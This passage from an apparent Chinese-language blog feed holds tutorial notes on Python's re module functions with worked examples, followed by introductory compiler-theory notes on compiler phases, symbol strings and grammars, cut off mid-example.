表示忽略大小写</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m = pattern.match(<span class="string">'Hello World Wide Web'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(m)<span class="comment"># 匹配成功，返回一个 Match 对象</span></span><br><span class="line">&lt;_sre.SRE_Match object at <span class="number">0x10bea83e8</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m.group(<span class="number">0</span>) <span class="comment"># 返回匹配成功的整个子串 'Hello World'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m.span(<span class="number">0</span>) <span class="comment"># 返回匹配成功的整个子串的索引 (0, 11)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m.group(<span class="number">1</span>) <span class="comment"># 返回第一个分组匹配成功的子串 'Hello'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m.span(<span class="number">1</span>) <span class="comment"># 返回第一个分组匹配成功的子串的索引 (0, 5)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m.group(<span class="number">2</span>) <span class="comment"># 返回第二个分组匹配成功的子串 'World'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m.span(<span class="number">2</span>) <span class="comment"># 返回第二个分组匹配成功的子串 (6, 11)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m.groups() <span class="comment"># 等价于 (m.group(1), m.group(2), ...) ('Hello', 'World')</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m.group(<span class="number">3</span>) <span class="comment"># 不存在第三个分组</span></span><br><span class="line"></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">IndexError: no such group</span><br></pre></td></tr></table></figure><ul><li><h4 id="re-search-amp-re-match"><a href="#re-search-amp-re-match" class="headerlink" title="re.search()&amp;re.match()"></a>re.search()&amp;re.match()</h4></li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line">re.search 扫描整个字符串并返回第一个成功的匹配。</span><br><span class="line"></span><br><span class="line">函数语法：</span><br><span class="line"></span><br><span class="line">re.search(pattern, string, flags=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">函数参数说明：</span><br><span class="line"></span><br><span class="line">pattern:匹配的正则表达式</span><br><span class="line">string:要匹配的字符串。</span><br><span class="line">flags:标志位，用于控制正则表达式的匹配方式，如：是否区分大小写，多行匹配等等。</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">匹配成功re.search方法返回一个匹配的对象，否则返回<span class="literal">None</span>。</span><br><span class="line"></span><br><span class="line">我们可以使用group(num) 或 groups() 匹配对象函数来获取匹配表达式。</span><br><span class="line"></span><br><span class="line">匹配对象方法</span><br><span class="line"></span><br><span class="line">group(num=<span class="number">0</span>):匹配的整个表达式的字符串，group() 可以一次输入多个组号，在这种情况下它将返回一个包含那些组所对应值的元组。</span><br><span class="line">groups():返回一个包含所有小组字符串的元组，从 <span class="number">1</span> 到 所含的小组号。</span><br><span class="line"></span><br><span class="line">实例</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">line = <span class="string">"Cats are smarter than dogs"</span>;</span><br><span class="line">searchObj = re.search( <span class="string">r'(.*) are (.*?) .*'</span>, line, re.M|re.I)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> searchObj:</span><br><span class="line">      <span class="keyword">print</span> (<span class="string">"searchObj.group() : "</span>, searchObj.group())</span><br><span class="line">      <span class="keyword">print</span> (<span class="string">"searchObj.group(1) : "</span>, searchObj.group(<span class="number">1</span>))</span><br><span class="line">      <span class="keyword">print</span> (<span class="string">"searchObj.group(2) : "</span>, searchObj.group(<span class="number">2</span>))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">      print( <span class="string">"Nothing found!!"</span>)</span><br><span class="line"></span><br><span class="line">以上实例执行结果如下：</span><br><span class="line"></span><br><span class="line">searchObj.group() : Cats are smarter than dogs</span><br><span class="line">searchObj.group(<span class="number">1</span>) : Cats</span><br><span class="line">searchObj.group(<span class="number">2</span>) : smarter</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">_____________________________________________________________________________</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">re.match 尝试从字符串的起始位置匹配一个模式，如果不是起始位置匹配成功的话，match()就返回none。</span><br><span class="line"></span><br><span class="line">函数语法：</span><br><span class="line"></span><br><span class="line">re.match(pattern, string, flags=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">函数参数说明：（同re.search一样）</span><br><span class="line"></span><br><span class="line">匹配成功re.match方法返回一个匹配的对象，否则返回<span class="literal">None</span>。</span><br><span class="line"></span><br><span class="line">我们可以使用group(num) 或 groups() 匹配对象函数来获取匹配表达式。</span><br><span class="line"></span><br><span class="line">匹配对象方法：（同re.search一样）</span><br><span class="line"></span><br><span class="line">实例</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">print(re.match(<span class="string">'www'</span>, <span class="string">'www.runoob.com'</span>).span()) <span class="comment"># 在起始位置匹配</span></span><br><span class="line">print(re.match(<span class="string">'com'</span>, <span class="string">'www.runoob.com'</span>)) <span class="comment"># 不在起始位置匹配</span></span><br><span class="line"></span><br><span class="line">以上实例运行输出结果为：</span><br><span class="line">(<span class="number">0</span>, <span class="number">3</span>) </span><br><span class="line"><span class="literal">None</span></span><br><span class="line"></span><br><span class="line">实例</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">line = <span class="string">"Cats are smarter than dogs"</span></span><br><span class="line">matchObj = re.match( <span class="string">r'(.*) are (.*?) .*'</span>, line, re.M|re.I)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> matchObj:</span><br><span class="line">     print(<span class="string">"matchObj.group() : "</span>, matchObj.group())</span><br><span class="line">     print(<span class="string">"matchObj.group(1) : "</span>, matchObj.group(<span class="number">1</span>))</span><br><span class="line">     print(<span class="string">"matchObj.group(2) : "</span>, matchObj.group(<span class="number">2</span>))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">     print(<span class="string">"No match!!"</span>)</span><br><span class="line"></span><br><span class="line">以上实例执行结果如下：</span><br><span class="line"></span><br><span class="line">matchObj.group() : Cats are smarter than dogs</span><br><span class="line">matchObj.group(<span class="number">1</span>) : Cats</span><br><span class="line">matchObj.group(<span class="number">2</span>) : smarter</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">____________________________________________________________________________</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">re.match与re.search的区别:</span><br><span class="line">re.match只匹配字符串的开始，如果字符串开始不符合正则表达式，则匹配失败，函数返回<span class="literal">None</span>；而re.search匹配整个字符串，直到找到一个匹配。</span><br><span class="line"></span><br><span class="line">实例</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">line = <span class="string">"Cats are smarter than dogs"</span>;</span><br><span class="line">matchObj = re.match( <span class="string">r'dogs'</span>, line, re.M|re.I)</span><br><span class="line"><span class="keyword">if</span> matchObj:</span><br><span class="line">     print(<span class="string">"match --&gt; matchObj.group() : "</span>, matchObj.group())</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">     <span class="keyword">print</span> (<span class="string">"No match!!"</span>)</span><br><span class="line">matchObj = re.search( <span class="string">r'dogs'</span>, line, re.M|re.I)</span><br><span class="line"><span class="keyword">if</span> matchObj:</span><br><span class="line">     print(<span class="string">"search --&gt; matchObj.group() : "</span>, matchObj.group())</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">     print(<span class="string">"No match!!"</span>)</span><br><span class="line"></span><br><span class="line">以上实例运行结果如下：</span><br><span class="line"></span><br><span class="line">No match!!</span><br><span class="line">search --&gt; matchObj.group() : dogs</span><br></pre></td></tr></table></figure><ul><li><h4 id="re-split"><a href="#re-split" class="headerlink" title="re.split()"></a>re.split()</h4></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">split 方法按照能够匹配的子串将字符串分割后返回列表，它的使用形式如下：</span><br><span class="line"></span><br><span class="line">re.split(pattern, string[, maxsplit=<span class="number">0</span>, flags=<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">参数:</span><br><span class="line">pattern:匹配的正则表达式</span><br><span class="line">string:要匹配的字符串。</span><br><span class="line">maxsplit:分隔次数，maxsplit=<span class="number">1</span> 分隔一次，默认为 <span class="number">0</span>，不限制次数。</span><br><span class="line">flags:标志位，用于控制正则表达式的匹配方式，如：是否区分大小写，多行匹配等等。</span><br><span class="line"></span><br><span class="line">实例</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;<span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>re.split(<span class="string">'\W+'</span>, <span class="string">'runoob, runoob, runoob.'</span>)</span><br><span class="line">[<span class="string">'runoob'</span>, <span class="string">'runoob'</span>, <span class="string">'runoob'</span>, <span class="string">''</span>]</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>re.split(<span class="string">'(\W+)'</span>, <span class="string">' runoob, runoob, runoob.'</span>)</span><br><span class="line">[<span class="string">''</span>, <span class="string">' '</span>, <span class="string">'runoob'</span>, <span class="string">', '</span>, <span class="string">'runoob'</span>, <span class="string">', '</span>, <span class="string">'runoob'</span>, <span class="string">'.'</span>, <span class="string">''</span>]</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>re.split(<span class="string">'\W+'</span>, <span class="string">' runoob, runoob, runoob.'</span>, <span class="number">1</span>)</span><br><span class="line">[<span class="string">''</span>, <span class="string">'runoob, runoob, runoob.'</span>]</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>re.split(<span class="string">'a*'</span>, <span class="string">'hello world'</span>) <span class="comment"># 对于一个找不到匹配的字符串而言，split 不会对其作出分割</span></span><br><span class="line">[<span class="string">'hello world'</span>]</span><br></pre></td></tr></table></figure><ul><li><h4 id="re-sub"><a href="#re-sub" class="headerlink" title="re.sub()"></a>re.sub()</h4></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">Python 的 re 模块提供了re.sub用于替换字符串中的匹配项。</span><br><span class="line"></span><br><span class="line">语法:</span><br><span class="line">re.sub(pattern, repl, string, count=<span class="number">0</span>, flags=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">参数：</span><br><span class="line">pattern : 正则中的模式字符串。</span><br><span class="line">repl : 替换的字符串，也可为一个函数。</span><br><span class="line">string : 要被查找替换的原始字符串。</span><br><span class="line">count : 模式匹配后替换的最大次数，默认 <span class="number">0</span> 表示替换所有的匹配。</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">实例:</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">phone = <span class="string">"2004-959-559 # 这是一个国外电话号码"</span></span><br><span class="line">num = re.sub(<span class="string">r'#.*$'</span>, <span class="string">""</span>, phone)   <span class="comment"># 删除字符串中的 Python注释</span></span><br><span class="line"><span class="keyword">print</span> (<span class="string">"电话号码是: "</span>, num)</span><br><span class="line">num = re.sub(<span class="string">r'\D'</span>, <span class="string">""</span>, phone) <span class="comment"># 删除非数字(-)的字符串</span></span><br><span class="line"><span class="keyword">print</span> (<span class="string">"电话号码是 : "</span>, num)</span><br><span class="line"></span><br><span class="line">以上实例执行结果如下：</span><br><span class="line"></span><br><span class="line">电话号码是: <span class="number">2004</span><span class="number">-959</span><span class="number">-559</span></span><br><span class="line">电话号码是 : <span class="number">2004959559</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">以下实例中将字符串中的匹配的数字乘以 <span class="number">2</span>：</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">double</span><span class="params">(matched)</span>:</span>   <span class="comment"># 将匹配的数字乘以 2</span></span><br><span class="line">    value = int(matched.group(<span class="string">'value'</span>))</span><br><span class="line">    <span class="keyword">return</span> str(value * <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">s = <span class="string">'A23G4HFD567'</span></span><br><span class="line">print(re.sub(<span class="string">'(?P&lt;value&gt;\d+)'</span>, double, s))</span><br><span class="line"></span><br><span class="line">执行输出结果为：</span><br><span class="line">A46G8HFD1134</span><br></pre></td></tr></table></figure><ul><li><h4 id="findall"><a href="#findall" class="headerlink" title="findall()"></a>findall()</h4></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">在字符串中找到正则表达式所匹配的所有子串，并返回一个列表，如果没有找到匹配的，则返回空列表。</span><br><span class="line"></span><br><span class="line">注意： match 和 search 是匹配一次,findall 匹配所有。</span><br><span class="line"></span><br><span class="line">语法格式为：</span><br><span class="line"></span><br><span class="line">findall(string[, pos[, endpos]])</span><br><span class="line"></span><br><span class="line">参数：</span><br><span class="line"></span><br><span class="line">string: 待匹配的字符串。</span><br><span class="line">pos: 可选参数，指定字符串的起始位置，默认为 <span class="number">0</span>。</span><br><span class="line">endpos: 可选参数，指定字符串的结束位置，默认为字符串的长度。</span><br><span class="line">查找字符串中的所有数字：</span><br><span class="line"></span><br><span class="line">实例</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">pattern = re.compile(<span class="string">r'\d+'</span>) <span class="comment"># 查找数字</span></span><br><span class="line">result1 = pattern.findall(<span class="string">'runoob 123 google 456'</span>)</span><br><span class="line">result2 = pattern.findall(<span class="string">'run88oob123google456'</span>, <span class="number">0</span>, <span class="number">10</span>) <span class="comment">#取字符串之中0-10之间的数字出来</span></span><br><span class="line">print(result1，result2)</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">[<span class="string">'123'</span>, <span class="string">'456'</span>]，[<span class="string">'88'</span>, <span class="string">'12'</span>]</span><br></pre></td></tr></table></figure><ul><li><h4 id="re-finditer"><a href="#re-finditer" class="headerlink" title="re.finditer()"></a>re.finditer()</h4></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">和 findall 类似，在字符串中找到正则表达式所匹配的所有子串，并把它们作为一个迭代器返回。</span><br><span class="line"></span><br><span class="line">re.finditer(pattern, string, flags=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">参数:</span><br><span class="line"></span><br><span class="line">pattern:匹配的正则表达式</span><br><span class="line">string:要匹配的字符串。</span><br><span class="line">flags:标志位，用于控制正则表达式的匹配方式，如：是否区分大小写，多行匹配等等。</span><br><span class="line"></span><br><span class="line">实例</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">it = re.finditer(<span class="string">r"\d+"</span>,<span class="string">"12a32bc43jf3"</span>)</span><br><span class="line"><span class="keyword">for</span> match <span class="keyword">in</span> it:</span><br><span class="line">    <span class="keyword">print</span> (match.group() )</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line"><span class="number">12</span> <span class="number">32</span> <span class="number">43</span> <span class="number">3</span></span><br></pre></td></tr></table></figure><ul><li><h4 id="re-escape"><a href="#re-escape" class="headerlink" title="re.escape()"></a>re.escape()</h4></li></ul><p>re.escape()的主要作用就是将一个字符串变成可以匹配的正则表达式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">re.escape是一个工具函数，用于对字符串中所有可能被视为正则表达式运算符的字符进行转义。使用这个函数的情况有：字符串很长，其中包含大量特殊字符，而你不想输入大量的反斜杠；你从用户那里获取了一个字符串（例如，通过函数input），想将其用于正则表达式中。下面的示例说明了这个函数的工作原理：</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>re.escape(<span class="string">'www.python.org'</span>) </span><br><span class="line"><span class="string">'www\\.python\\.org'</span> </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>re.escape(<span class="string">'But where is the ambiguity?'</span>) </span><br><span class="line"><span class="string">'But\\ where\\ is\\ the\\ ambiuity\\?'</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> re </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Re </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Compiler</title>
      <link href="/2019/09/04/Compiler/"/>
      <url>/2019/09/04/Compiler/</url>
      
        <content type="html"><![CDATA[<h2 id="引论"><a href="#引论" class="headerlink" title="引论"></a>引论</h2><p>编译原理是良好的数学基础和好的工程结构功能的结合。</p><p>Compiler：编译，述而不作，忠于编写的东西</p><p>编译器从逻辑上可以分成若干阶段，<strong>每个阶段把源程序从一种表示变换成另一种表示</strong></p><h3 id="1-1什么叫编译程序"><a href="#1-1什么叫编译程序" class="headerlink" title="1.1什么叫编译程序"></a>1.1什么叫编译程序</h3><p>翻译器（翻译程序）：Translater</p><p>能将一种语言程序（源语言程序）转换成另一种等价的语言程序（目标语言程序）</p><p>编译器（编译程序）：Compiler</p><p>能将一种计算机高级语言程序（源语言程序）转换成另一种等价的计算机低级语言程序（目标语言程序）</p><p>解释器（解释程序）：Interpreter</p><p>也是一种翻译程序，以一种语言写的源程序作为输入，但不产生目标代码，而是边解释边执行</p><p>解释器和编译器的区别：</p><p>①编译分成两步完成：先翻译，在运行</p><p>②解释只用一步就完成：边解释边执行</p><p>可变目标编译程序（Retargetable Compiler）</p><p>交叉编译程序（Cross Compiler）</p><h3 id="1-2编译程序的组成"><a href="#1-2编译程序的组成" class="headerlink" title="1.2编译程序的组成"></a>1.2编译程序的组成</h3><p><img src="/2019/09/04/Compiler/1.2_1.jpg" alt></p><p> 词法分析器：读入组成源程序的字符流，并将它们组织成为有意义的词素的序列</p><p>语法分析器：使用由词法分析器生成的各个词法单元的第一个分量来创建树形的中间表示，该中间表示给出了词法分析产生的词法单元流的语法结构。一个常用的表示方法便是语法树，树中的每个内部节点表示一个运算</p><p>语义分析器：使用语法树和符号表中的信息来检查源程序是否和语言定义的语义一致。同时也收集类型信息，并把这些信息存放在语法树或符号表中，以便在随后的中键代码生成过程中使用。</p><p>中间代码生成器：在把一个源程序翻译成目标代码的过程中，一个编译器可能构造出一个或多个中间表示。这些中间表示可以有多种形式。比如语法树是一种中间表示形式，通常在语法分析和语义分析中使用。</p><p>代码优化器：机器无关的代码优化步骤试图改进中间代码，以便生成更好的目标代码</p><p>代码生成器：代码生成器以源程序的中间表示形式作为输入，并把它映射到目标语言。</p><p>符号表管理器：记录源程序中使用的变量的名字，并收集和每个名字的各种属性有关的信息。</p><blockquote><p>Tips:</p><p>如何学习构造编译程序</p><p>（1）源语言，对被编译的源程序深刻理解其结构和含义</p><p>（2）目标语言，假定目标语言是机器语言，就必须搞清楚硬件的系统结构和操作系统的功能</p><p>（3）编译方法，把一种语言翻译成另一种语言的方法很多，重点</p></blockquote><h2 id="高级语言及其语法描述"><a href="#高级语言及其语法描述" class="headerlink" title="高级语言及其语法描述"></a>高级语言及其语法描述</h2><h3 id="2-1程序语言的语法和语义"><a href="#2-1程序语言的语法和语义" class="headerlink" title="2.1程序语言的语法和语义"></a>2.1程序语言的语法和语义</h3><h4 id="2-1-1语法"><a href="#2-1-1语法" class="headerlink" title="2.1.1语法"></a>2.1.1语法</h4><p>任何语言均可作一个集合。这个集合中的每个元素都是在一定符号集（字母表）上的一个符号串。</p><p>对于自然语言来说，他们是定义在某个字母表上的<strong>句子的集合</strong></p><p>对于程序语言来说，他们也是定义在某个字母表上的<strong>句子</strong>的集合。这里的句子，就是一个源程序。</p><p>词法规则：单词符号是语言中具有独立意义的最基本单位。语言的单词符号是由词法规则所确定的，即词法规则规定了单词符号的形成规则。</p><p>语法规则：上下文无关文法或BNF（Backus-Naur范式）</p><h4 id="2-1-2语义"><a href="#2-1-2语义" class="headerlink" title="2.1.2语义"></a>2.1.2语义</h4><p>语义，定义程序的意义</p><p>没有公认的形式系统描述语义</p><h3 id="2-2程序语言的一般特征"><a href="#2-2程序语言的一般特征" class="headerlink" title="2.2程序语言的一般特征"></a>2.2程序语言的一般特征</h3><h4 id="高级语言的分类"><a href="#高级语言的分类" class="headerlink" title="高级语言的分类"></a>高级语言的分类</h4><ul><li>强制性语言（Imperative Language）|过程式语言：Fortran，C，Pascal</li><li>应用式语言（Applicative Language）|函数式语言：LISP</li><li>基于规则的语言（Ruled-based Language）：Prolog</li><li>面向对象语言（Object-oriented Language）：JAVA，c++</li></ul><h3 id="2-3程序语言的语法描述"><a href="#2-3程序语言的语法描述" class="headerlink" title="2.3程序语言的语法描述"></a>2.3程序语言的语法描述</h3><h4 id="一、字母表和符号串"><a href="#一、字母表和符号串" class="headerlink" title="一、字母表和符号串"></a>一、字母表和符号串</h4><p>  <strong>字母表</strong>：符号的非空有限集合   例：∑ ={a，b，c}</p><p>  <strong>符号</strong>：字母表中的元素         例： a，b，c</p><p>  <strong>符号串</strong>：符号的有穷序列       例：a, aa, ac, abc，..</p><p>  <strong>空符号串</strong>：无任何符号的符号串( ε )    </p><blockquote><p><strong>符号串的形式定义</strong></p><p>   有字母表∑，定义：</p><p>  （1）ε是∑上的符号串；</p><p>  （2）若x是∑上的符号串，且a∈ ∑，则ax或xa是 ∑ 上的符号串；</p><p>  （3）y是∑上的符号串，iff（当且仅当）y可由（1）和（2）产生。   </p></blockquote><p>  <strong>符号串集合</strong>：由符号串构成的集合。</p><h4 id="二、符号串和符号串集合的运算"><a href="#二、符号串和符号串集合的运算" class="headerlink" title="二、符号串和符号串集合的运算"></a>二、符号串和符号串集合的运算</h4><p><strong>符号串相等</strong>：若x、y是集合上的两个符号串，则x＝y，iff（当且仅当）组成x的每一个符号和组成y的<strong>每一个</strong>符号依次相等。</p><p><strong>符号串的长度</strong>：若x为符号串，其长度|x|等于组成该符      号串的符号个数。（例：x＝STV， |x|=3）</p><p><strong>符号串的连接</strong>：若x、y是定义在Σ是上的符号串，且x＝XY，y＝YX，则x和y的连接 xy＝XYYX也是Σ上的符号串。（注意：一般<code>xy ≠ yx</code>，但是<code>εx = xε</code>）</p><p><strong>符号串集合的乘积运算</strong>：令A、B为符号串集合，定义<code>AB＝{ xy | x∈A, y∈B}</code></p><p><strong>符号串集合的幂运算</strong>：有符号串集合A，定义A<sup>0</sup> ={ε},  A<sup>1</sup>=A,  A<sup>2</sup>=AA,  A<sup>3</sup>=AAA,…… ……,                    A<sup>n</sup>＝A<sup>n-1</sup>A=AA<sup>n-1 </sup> ，n&gt;0</p><p><strong>符号串集合的闭包运算</strong>：设A是符号串集合，定义  A<sup>＋</sup>＝ A<sup>1</sup> ∪ A<sup>2</sup> ∪ A<sup>3</sup> ∪……∪ A<sup>n</sup> ∪……  称为集合A的正则闭包。A*＝ A<sup>0</sup> ∪A<sup>＋ </sup>称为集合A的闭包。（A<sup>0</sup> = { ε } ）</p><p><strong>为什么对符号、符号串、符号串集合以及它们的运算感兴趣？</strong></p><p>若A为某语言的基本字符集</p><p>​        A＝{a,b,……z,0,1,……,9, +,－,×,_/, ( , ), =……}</p><p>B为单词集</p><p>​     B ={begin, end, if, then,else,for,……,&lt;标识符&gt;,&lt;常量&gt;,……}</p><p>  则B ⊂  A* 。</p><p>语言的句子是定义在B上的符号串。</p><p>若令C为句子集合，则C ⊂ B<sup>*</sup>  ,  程序 ⊂ C</p><h4 id="三、文法的直观理解"><a href="#三、文法的直观理解" class="headerlink" title="三、文法的直观理解"></a>三、文法的直观理解</h4><p><strong>1.什么是文法</strong>：文法是对语言结构的定义与描述。即从形式上用于描述和规定语言结构的称为“文法”（或称为“语法”）。</p><p><strong>2.语法规则</strong>：我们通过建立一组规则（产生式），来描述句子的语法结构。规定用“<code>::=</code>”表示“由……组成“。</p><blockquote><p>例如：</p><p>&lt;句子&gt;::=&lt;主语&gt;&lt;谓语&gt;</p><p>&lt;主语&gt;::=&lt;代词&gt;|&lt;名词&gt;</p><p>&lt;代词&gt; ::=你|我|他</p><p>&lt;名词&gt;::= 